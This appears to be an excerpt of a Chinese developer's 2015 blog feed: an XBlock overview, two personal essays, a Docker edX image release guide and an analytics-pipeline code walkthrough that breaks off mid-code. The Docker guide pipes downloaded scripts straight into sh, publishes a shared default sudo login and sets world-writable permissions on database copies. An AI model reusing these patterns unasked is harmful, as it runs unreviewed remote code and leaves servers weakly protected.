&lt;p&gt;我前前后后写了三四个XBlock组件了，对这一块还算熟悉，最近想写&lt;a href="https://github.com/edx/XBlock"&gt;XBlock&lt;/a&gt;相关的文章，将自己的经验进行归纳，也方便给后来者做个参考。如果能帮助到你，就太棒了&lt;/p&gt;
&lt;p&gt;XBlock对这样一些团队/创业项目会特别有益，他们有很明确的业务场景（教育相关），使用edX作为基础平台，他们针对某些教育内容/科目，有一套自己的教学方案，使用这套方案优化了教学流程本身，诸如能对学生进行引导或是让其进入沉浸式学习&lt;/p&gt;
&lt;p&gt;那么这样的团队很多时候其实不需要从零开始打造一个自己的教学平台，而是以edx为基础，使用XBlock，打造自己的学习组件即可。这样一来在免费享用edx平台本身通用而强大特性的同时，又满足自己的定制需求。&lt;/p&gt;
&lt;p&gt;XBlock是个很庞杂的东西，而这个项目又在持续演进中，文档不仅不够完整，还不够稳定。要弄清楚它是个什么东西，可以用来干什么，都有哪些特性，并不容易，下边我们就针对这几个问题入手。文章的最后我会把相关资料整理汇总&lt;/p&gt;
&lt;p&gt;在此之前我先发表下我的观点，不客观，不中立，带有强烈感情色彩 :)&lt;/p&gt;
&lt;h1&gt;我的观点&lt;/h1&gt;
&lt;p&gt;我觉得它是edX最好的设计之一，通过引入一种开放的机制，让课程组件体系保持了扩展性。&lt;/p&gt;
&lt;p&gt;edx不像大多数平台，假设自己完全知道用户的需求，据此打造一个“完备”而封闭的平台，宣称为你准备好了“你一定喜欢的东西”，这种封闭而愚蠢的做法，苹果和微软似乎都很偏好，国内公司更不必说。当他们说你能这样做的时候，多数情况是说你只能这样做。&lt;/p&gt;
&lt;p&gt;开放不只是一种品味，它本身是一种聪明的策略。&lt;/p&gt;
&lt;h1&gt;那么它是什么东西&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/edx/XBlock"&gt;XBlock&lt;/a&gt;的自我描述是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;XBlock courseware component architecture&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说它是课程组件体系。课程组件是edx中很核心的一部分，这个不难理解，edx平台的学习内容都由课程组件来呈现，如果你在edx中制作过课程，应该知道我在说什么。&lt;/p&gt;
&lt;p&gt;而Xblock是用于建造课件的东西&lt;/p&gt;
&lt;p&gt;我们在edx中创建一门课程的时候，往往是叠加课程组件的过程，诸如播放控件，问题控件，论坛控件。先前的这些既有控件，叫做xmodule，后来课程团队觉得需要重构这部分，于是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We are developing a second-generation API for these components called XBlocks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;和LTI的区别&lt;/h3&gt;
&lt;p&gt;那么有人可能要问，他和LTI(Learning Tools Interoperability)的区别是什么。毕竟LTI也能对LMS进行扩展呀&lt;/p&gt;
&lt;p&gt;先介绍下LTI，LTI标准可以让远程的工具和内容被嵌入LMS学习管理系统中，edx也支持LTI。&lt;/p&gt;
&lt;p&gt;两者的区别主要由以下几点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XBlocks是Python语言层级的API，他是一个具体可用的实现，而不是标准，诸如你可以轻易的使用XBlocks来为你的课程组件提供存储功能&lt;/li&gt;
&lt;li&gt;XBlocks可以用来包装LTI，你可以打造一个LTI XBlock&lt;/li&gt;
&lt;li&gt;最后，XBlocks是可直接部署在edx中的，作为一个python库的形式，而不像LTI需要跑起整个镜像来提供服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;XBlock与djangpapp的区别&lt;/h3&gt;
&lt;p&gt;关于这一点官方在xblock的介绍中说的很清楚了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;XBlocks are like miniature web applications: they maintain state in a storage layer, render themselves through views, and process user actions through handlers.&lt;/p&gt;
&lt;p&gt;XBlocks differ from web applications in that they render only a small piece of a complete web page.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;可以用来干什么&lt;/h1&gt;
&lt;p&gt;当然是用来打造你自己的课程组件啦。至于都可以做出那些花样，可以参考既有的组件，又或是wiki里列出的第三方组件:&lt;a href="https://github.com/edx/edx-platform/wiki/List-of-XBlocks"&gt;List of XBlocks&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;有哪些特性&lt;/h1&gt;
&lt;p&gt;在此主要说说在技术层面上的特性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供数据存储功能，数据存在Mysql&lt;/li&gt;
&lt;li&gt;有很好的权限控制机制&lt;/li&gt;
&lt;li&gt;xblock中允许调用平台既有组件（这样一来你可以想象有多强大了）&lt;/li&gt;
&lt;li&gt;xblock之间可以通信&lt;/li&gt;
&lt;li&gt;xblock可以作为django app安装，来提供更强大的功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关资料&lt;/h1&gt;
&lt;h2&gt;相关源码库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/XBlock"&gt;XBlock&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xblock-utils"&gt;xblock-utils&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xblock-sdk"&gt;xblock-sdk&lt;/a&gt; 用于开发XBlock&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;文档&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://xblock.readthedocs.org/"&gt;xblock.readthedocs.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/xblock-tutorial/en/latest/index.html"&gt;xblock-tutorial&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;案例引导&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://opencraft.com/doc/edx/xblock/tutorial.html"&gt;tutorial&lt;/a&gt; 版本有些旧&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;XBlock第三方组件汇总&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/List-of-XBlocks"&gt;List of XBlocks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;安装与配置&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/Installing-a-new-XBlock"&gt;Installing a new XBlock&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;至于开发相关的东西，放在之后的文章里介绍&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 13 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-13:about-XBlocks.html</guid><category>edx</category></item><item><title>夜雨与流萤</title><link>/rain-and-firefly.html</link><description>&lt;p&gt;&lt;img alt="firefly" src="img/firefly.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;晚饭之后，碗筷洗完，天色已黑。&lt;/p&gt;
&lt;p&gt;乘地铁过苜蓿园，下马坊，孝陵卫，至钟灵街&lt;/p&gt;
&lt;p&gt;出一号口，往北，小跑十余分钟，至灵谷景区，地处紫金山。沿途梧桐，路灯昏黄，三两行人，与之搭讪，皆为萤火而去&lt;/p&gt;
&lt;p&gt;入园中，气氛森森，路灯苍白，稀疏错落，近来南京多雷雨天气，星月全无。而道路两旁，树木苍天。&lt;/p&gt;
&lt;p&gt;前行数百米，雷声渐作。行人中拖家带口者，皆已返程，恐小孩着凉。&lt;/p&gt;
&lt;p&gt;而毅然前行者，半数胸前单反，为萤火而来，不肯善罢甘休。&lt;/p&gt;
&lt;p&gt;复前行，行人渐少，而路灯全无，众人心照不宣，熄灯夜行，恐破坏气氛。&lt;/p&gt;
&lt;p&gt;路面如洗，光洁明亮，虽无月色，亦清晰可辨。&lt;/p&gt;
&lt;p&gt;过一石门，迎面石兽，不辨狮虎，面目狰狞。&lt;/p&gt;
&lt;p&gt;拾阶而上，道路两旁，树木较此前更高，而两三萤火闪烁其间，平添生趣。&lt;/p&gt;
&lt;p&gt;俄尔，大雨骤降，间以电闪雷鸣，行人皆退至石门避雨，前行者又少。&lt;/p&gt;
&lt;p&gt;仗一身臭汗，无所畏惧，欣然而往，雨势渐大，路旁林间，萤火渐盛。天地间唯有雷声雨声。&lt;/p&gt;
&lt;p&gt;偶有流萤落于手臂，置于掌中，咫尺微光，忽明忽灭，状如呼吸，煞是可爱&lt;/p&gt;
&lt;p&gt;见有人持单反入林间，从之。小路泥泞，宽不及肩。跌跌撞撞，行至林中，身侧萤火环绕，美轮美奂，无以言说&lt;/p&gt;
&lt;p&gt;如一池春水，明月当空，清风徐来，浮光跃金。而色泽更嫩，且灵动过之。万点浮光，起伏明灭，往来穿梭于林间，往来穿梭于身侧，落于手臂，落于发梢。&lt;/p&gt;
&lt;p&gt;如梦如幻，真人间绝色。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;慢跑而归，十余分钟，到地铁口，恍如隔世&lt;/p&gt;
&lt;p&gt;闹市之中，竟别有洞天，此间萤火，真大隐隐于市&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 12 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-12:rain-and-firefly.html</guid><category>随笔</category></item><item><title>一种寂寞</title><link>/a-kind-of-loneliness.html</link><description>&lt;p&gt;雨并不大，淅淅沥沥，下了一天。&lt;/p&gt;
&lt;p&gt;傍晚下班，下电梯的时候，突然想到，昨晚本来打算同一朋友聊认知论相关的东西，结果昨晚回来的迟，之后又读了封邮件，把这事给忘了。&lt;/p&gt;
&lt;p&gt;一时兴起，决定穿着拖鞋，打着伞，就不坐地铁，走回去好了，边走边继续昨天的话题。认知论相关的问题是在是我遇到过最有趣的问题之一，难得遇到个感兴趣的朋友，秉烛夜谈恐怕太难，打着伞，吹着冷风，边走边聊，却也是惬意之极。&lt;/p&gt;
&lt;p&gt;从罗素的《哲学问题》开始，然后可能会路过笛卡尔，洛克，贝克莱，到休谟的时候，最有趣了，休谟一拳打出去，之后的数百年来，大家都很受伤，之后康德做出迎击，一路风起云涌，吸引了一大批顶尖的头脑，比历史进程中沿途的刀光血影精彩百倍。&lt;/p&gt;
&lt;p&gt;沿路梧桐，车如流水。&lt;/p&gt;
&lt;p&gt;我正兴致盎然胡扯一通，想着如何能把这些线索理清，又能讲得有趣。&lt;/p&gt;
&lt;p&gt;可发现小伙伴此时却不在线呀，满腔热情，多么可惜。本来都想好，聊得起劲的话，索性沿途买些水果，边聊边吃，一手提包，一手拿吃的，索性就不撑伞淋回去，再洗个澡好啦&lt;/p&gt;
&lt;p&gt;&lt;img alt="loneliness.png" src="img/loneliness.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;我想象这样一种美好&lt;/p&gt;
&lt;p&gt;合适的时间，合适的话题，遇到合适的人也恰好处于相似的心境之下，是多么难得，需要运气，而近乎奢侈的一件事呀&lt;/p&gt;
&lt;p&gt;而天气正好，下点小雨，穿着拖鞋，该是多么落魄的浪漫&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 06 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-06:a-kind-of-loneliness.html</guid><category>随笔</category></item><item><title>发布基于docker的edx birch-1国内版本</title><link>/docker-edx-birch-1.html</link><description>&lt;p&gt;北京时间，公元2015年7月3号7点49分，我一边舔着酸奶盖，一边在国内服务器上拉取下午发布到&lt;a href="https://hub.docker.com/"&gt;docker hub&lt;/a&gt;上的wwj718/edx-lite:birch-1镜像，在不需要vpn的情况下依然可行 :)&lt;/p&gt;
&lt;p&gt;那么第一版的发布工作就宣告完成啦.欢迎大家试用与反馈(我的邮箱 : wuwenjie718@gmail.com)&lt;/p&gt;
&lt;p&gt;以“北京时间xxx”开头感觉好装X，有木有！&lt;/p&gt;
&lt;p&gt;谢谢你们没有朝我扔白菜鸡蛋&lt;/p&gt;
&lt;p&gt;基础工作归功于&lt;a href="http://appsembler.com/"&gt;appsembler&lt;/a&gt;,我的版本基于他们此前的工作, 那么给人家打个广告也是应该的，appsembler这样介绍自己&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Appsembler has worked with both corporations and institutions of higher education to help them successfully implement their online learning initiatives with the Open edX™ platform.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;公司位于英国剑桥&lt;/p&gt;
&lt;p&gt;他们热衷于开源，积极回馈社区，良心企业简直是，此前我给他们写过一封邮件，询问何时发布birch版本，他们很热心回了邮件，说近来忙碌，暂时没有时间发布，因为发布前有不少清理工作，所以我自行开始这项工作。此后准备持续推进这个版本，也欢迎国内用户给与反馈，如果国内社区成形，此后将交由社区维护&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;特性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;开箱可用fullstack&lt;/li&gt;
&lt;li&gt;增强开发环境&lt;/li&gt;
&lt;li&gt;给出一些常见定制开发的案例和脚手架：主题，xblock 等&lt;/li&gt;
&lt;li&gt;将参数设置得适合国内使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;h2&gt;Quick Start&lt;/h2&gt;
&lt;h4&gt;安装docker(我用的是docker1.7)&lt;/h4&gt;
&lt;p&gt;国内用户优先考虑使用：&lt;code&gt;curl -sSL https://get.daocloud.io/docker | sh&lt;/code&gt;,如果你这样做，就不必看官方推荐做法了，直接跳到&lt;code&gt;国内加速&lt;/code&gt;部分&lt;/p&gt;
&lt;p&gt;官方推荐做法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ubuntu12.04:&lt;code&gt;sudo apt-get install linux-image-generic-lts-trusty&lt;/code&gt; , &lt;code&gt;sudo reboot&lt;/code&gt; , &lt;code&gt;curl -sSL https://get.docker.com/ | sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ubuntu14.04:&lt;code&gt;curl -sSL https://get.docker.com/ | sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Mac:&lt;a href="https://github.com/boot2docker/osx-installer/releases/tag/v1.7.0"&gt;boot2docker osx-installer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Windows:&lt;a href="https://github.com/boot2docker/windows-installer/releases/tag/v1.7.0"&gt;boot2docker windows-installer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他操作系统可参考:&lt;a href="https://docs.docker.com/installation"&gt;docker installation&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;国内加速&lt;/h4&gt;
&lt;p&gt;https://dashboard.daocloud.io/mirror&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;echo "DOCKER_OPTS=\"\$DOCKER_OPTS --registry-mirror=http://your-id.m.daocloud.io\"" | sudo tee -a /etc/default/docker&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo service docker restart&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意为了获得&lt;code&gt;your-id&lt;/code&gt;，你需要注册https://dashboard.daocloud.io/mirror&lt;/p&gt;
&lt;h4&gt;拉取镜像&lt;/h4&gt;
&lt;p&gt;sudo docker pull wwj718/edx-lite:birch-1&lt;/p&gt;
&lt;h4&gt;run it&lt;/h4&gt;
&lt;p&gt;sudo docker run -itd -p 8001:80 -p 8002:18010  wwj718/edx-lite:birch-1&lt;/p&gt;
&lt;p&gt;ok！好啦！就这么简单，打开&lt;code&gt;&amp;lt;ip&amp;gt;:8001&lt;/code&gt;就可以看到lms，&lt;code&gt;&amp;lt;ip&amp;gt;:8002&lt;/code&gt;对应cms&lt;/p&gt;
&lt;h2&gt;wwj718/edx-lite:birch-1特性&lt;/h2&gt;
&lt;h3&gt;Done&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以同时作为&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack"&gt;devstack&lt;/a&gt;和&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Full-Stack"&gt;fullstack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;devstack加入了mongo调试面板&lt;/li&gt;
&lt;li&gt;devstack加入了&lt;a href="https://github.com/django-extensions/django-extensions"&gt;django-extensions&lt;/a&gt;，可以极大地方便django的开发调试工作，包括debug神器&lt;a href="https://github.com/mitsuhiko/werkzeug"&gt;Werkzeug&lt;/a&gt;都默认装好了&lt;/li&gt;
&lt;li&gt;简单优化了系统环境：中文支持，性能查看工具，编辑环境&lt;/li&gt;
&lt;li&gt;推荐使用sudo账号(edxcn:edxcn),默认的shell是fish &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Todo&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;汉化&lt;/li&gt;
&lt;li&gt;theme&lt;/li&gt;
&lt;li&gt;email&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;将其作为开发环境(devstack)&lt;/h2&gt;
&lt;h3&gt;why docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;轻量化，docker比virtualbox要节约内存得多，跑edx的速度也快得多&lt;/li&gt;
&lt;li&gt;协作变得容易，团队成员之间的协作开发模式，变得与git相似，环境和开发成果的同步变得容易&lt;/li&gt;
&lt;li&gt;开发成果很容易直接部署到生产环境，几乎就是一键式的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以参考我的这篇文章:&lt;a href="http://wwj718.github.io/edx-popularize-community-docker.html"&gt;edx推广，国内社区与docker&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;use it&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo docker run -itd -p 8001:80 -p 8002:18010 -p 8005:5000  -p 8022:22 wwj718/edx-lite:birch-1

sudo docker ps #获取&amp;lt;container_id&amp;gt;

sudo docker exec -it &amp;lt;container_id&amp;gt; bash #进入到容器里

sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings devstack  #开发状态

sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver_plus 0.0.0.0:5000 --settings devstack  #增强调试功能

sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms show_urls --settings devstack #show_urls

#更过增强功能可以参考[django-extensions](https://github.com/django-extensions/django-extensions)

#做相应的定制开发

#保存提交定制开发的成果，可以类比git commit
docker commit -a &amp;quot;Author&amp;quot; -m &amp;quot;commit message&amp;quot; &amp;lt;container_id&amp;gt; [REPOSITORY[:TAG]]

#push，可以类比git push
docker push [REPOSITORY[:TAG]]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;push 之后，团队成员就可以通过docker pull [REPOSITORY[:TAG]]来共享你的工作成果了&lt;/p&gt;
&lt;p&gt;代码用git管理，尽量减少docker commit&lt;/p&gt;
&lt;h3&gt;当前状态&lt;/h3&gt;
&lt;p&gt;当前的版本主要功能是为开发准备的，秀一下效果：
&lt;img alt="docker_birch1_1" src="img/edx/docker/docker_birch1_1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="docker_birch1_2" src="img/edx/docker/docker_birch1_2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="docker_birch1_3" src="img/edx/docker/docker_birch1_3.jpeg" /&gt;&lt;/p&gt;
&lt;h2&gt;将其作为生产环境(fullstack)&lt;/h2&gt;
&lt;p&gt;性能高于虚拟机，与在实体机上部署相当&lt;/p&gt;
&lt;p&gt;默认情况下，该镜像run起来后，80，18010端口对应lms，cms&lt;/p&gt;
&lt;p&gt;如果需要用作fullstack，需要使用docker -v挂载数据卷，防止数据丢失&lt;/p&gt;
&lt;p&gt;当前版本未做充足测试，只推荐小规模测试使用。&lt;/p&gt;
&lt;h3&gt;挂载数据卷&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#首先要把数据库的数据复制到宿主机器
##在容器内
/etc/init.d/mysql stop
/etc/init.d/mongodb stop
cp /var/lib/mysql /tmp -r
cp /var/lib/mongodb /tmp -r
chmod -R 777 /tmp
##在宿主机
scp -P 18022 -rp edxcn@127.0.0.1:/tmp/mongodb /opt/mongodb
scp -P 18022 -rp edxcn@127.0.0.1:/tmp/mysql /opt/mysql

sudo docker run -itd  -v  /opt/mysql:/var/lib/mysql  -v /opt/mongodb:/var/lib/mongodb -p 8001:80 -p 8002:18010 -p 8005:5000  -p 18022:22 wwj718/edx-lite:birch
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上方式并不好，最好的在build的时候就处理好数据卷的问题&lt;/p&gt;
&lt;p&gt;如果不挂载数据卷的话，每次docker commit 数据都会被提交，造成image很大&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 03 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-03:docker-edx-birch-1.html</guid><category>edx</category></item><item><title>edx-analytics-pipeline源码解读</title><link>/edx-analytics-pipeline-code-analysis.html</link><description>&lt;blockquote&gt;
&lt;p&gt;提供机制，而不是策略  --《Unix编程艺术》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;是什么鬼&lt;/h1&gt;
&lt;p&gt;它这样自我介绍：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Hadoop-based data pipeline.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;是edx数据分析和可视化的成员组件之一，主要的功能是从track log中挖掘信息。数据挖掘的业务逻辑，都在这个源码库里，接受track log作为输入,（关于track log，可以参看我此前的&lt;a href="http://wwj718.github.io/edx-tracking-logs-data-research.html"&gt;这篇文章&lt;/a&gt;）,从中提取信息，输出结果到mysql中。至于数据的呈现，主要是&lt;a href="https://github.com/edx/edx-analytics-dashboard"&gt;edx-analytics-dashboard&lt;/a&gt;的职责。&lt;/p&gt;
&lt;p&gt;我在&lt;a href="http://wwj718.github.io/edx-data-analysis-on-docker.html"&gt;基于docker的edx数据分析&lt;/a&gt; 提到，我用docker打包了&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;相关的依赖，利用它可以从track log中提取信息，可以分析出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每周课程活跃情况&lt;/li&gt;
&lt;li&gt;各项答案分布情况&lt;/li&gt;
&lt;li&gt;课程注册情况报表&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你同时安装好了insights，那么将看到以下效果&lt;/p&gt;
&lt;p&gt;&lt;img alt="enrollment_chart" src="img/edx/analysis/enrollment_chart.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="engagement_chart_SPOC" src="img/edx/analysis/engagement_chart_SPOC.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="problem_display_name" src="img/edx/analysis/problem_display_name.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="video_frequent_replays" src="img/edx/analysis/video_frequent_replays.png" /&gt;&lt;/p&gt;
&lt;p&gt;更多可视化呈现结果请看&lt;a href="http://edx.readthedocs.org/projects/edx-insights/en/latest/engagement/Engagement_Video.html"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;为何需要深入源码&lt;/h1&gt;
&lt;p&gt;我们看到对学生观看视频之类的行为，虽然track log里有记录原始数据(&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/tracking_logs.html"&gt;tracking_logs&lt;/a&gt;)，可目前的官方进度还没走到这里，尚未对此做出分析,就是说这些数据需要我们自己去挖掘，那么有兴趣的小伙伴们，就需要理解&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;的源码，从而能够自己去挖掘track log里丰富的信息。可以玩出的花样，取决于你的想象力&lt;/p&gt;
&lt;p&gt;其实，不少课程团队都会有各种动机去分析课程所产生的数据。而且这些数据的用途，和产生的价值很可能超出平台设计者的想象，那么edx在此做的很棒的工作便是，不去自作聪明地假定了解用户的需求，而是开放了数据，把分析的工作交由平台的使用者&lt;/p&gt;
&lt;h1&gt;切入点&lt;/h1&gt;
&lt;p&gt;我们从一个案例开始。&lt;/p&gt;
&lt;p&gt;在安装好依赖后，我的第一个分析工作是从tracking log中提取出学生答案的分布情况&lt;/p&gt;
&lt;p&gt;也就是这条指令：&lt;code&gt;launch-task AnswerDistributionToMySQLTaskWorkflow [options]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;跟踪这条指令，弄懂它是如何被执行的，我们就能对edx-analytics-pipeline的设计和逻辑流有个大体上的认识，之后的hack和定制就会容易许多。&lt;/p&gt;
&lt;h2&gt;launch-task&lt;/h2&gt;
&lt;p&gt;首先关注&lt;code&gt;launch-task&lt;/code&gt;,如果你有写过python库，很容易看出&lt;code&gt;launch-task&lt;/code&gt;是一个&lt;code&gt;command-line tool&lt;/code&gt;，可以在setup.py的&lt;code&gt;entry point&lt;/code&gt;里找到它。&lt;/p&gt;
&lt;p&gt;于是我们找到&lt;code&gt;launch-task = edx.analytics.tasks.launchers.local:main&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是顺藤摸瓜，找到了入口函数&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# In order to see errors during extension loading, you can uncomment the next line.&lt;/span&gt;
    &lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;basicConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DEBUG&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Load tasks configured using entry_points&lt;/span&gt;
    &lt;span class="c1"&gt;# TODO: launch tasks by their entry_point name&lt;/span&gt;
    &lt;span class="n"&gt;stevedore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ExtensionManager&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edx.analytics.tasks&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;configuration&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_config&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;OVERRIDE_CONFIGURATION_FILE&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Using override.cfg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;OVERRIDE_CONFIGURATION_FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;override_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;override_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_config_path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;OVERRIDE_CONFIGURATION_FILE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
